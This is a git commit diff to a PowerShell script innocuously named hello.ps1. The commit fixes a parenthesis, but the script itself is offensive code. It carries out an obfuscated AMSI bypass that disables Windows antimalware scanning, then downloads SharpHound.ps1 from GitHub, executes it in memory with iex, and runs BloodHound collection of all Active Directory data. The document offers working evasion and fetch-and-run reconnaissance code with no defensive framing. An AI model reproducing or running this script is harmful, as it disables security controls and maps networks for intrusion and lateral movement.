f7142f66feddab72efc649b9ba2e1fc5fd533c23
Li0ris1it <133876420+Li0ris1it@users.noreply.github.com>
2023-08-17 14:15:35 +0300

    Update hello.ps1

--- hello.ps1
+++ hello.ps1
@@ -2,6 +2,6 @@ $w = 'System.Management.Automation.A'
 $c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'); $field.SetValue($null,$true)
-$a = curl -usebasicparsing -URI https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1).content 
+$a = (curl -usebasicparsing -URI https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1).content 
 iex($a)
 Invoke-BloodHound -CollectionMethod All
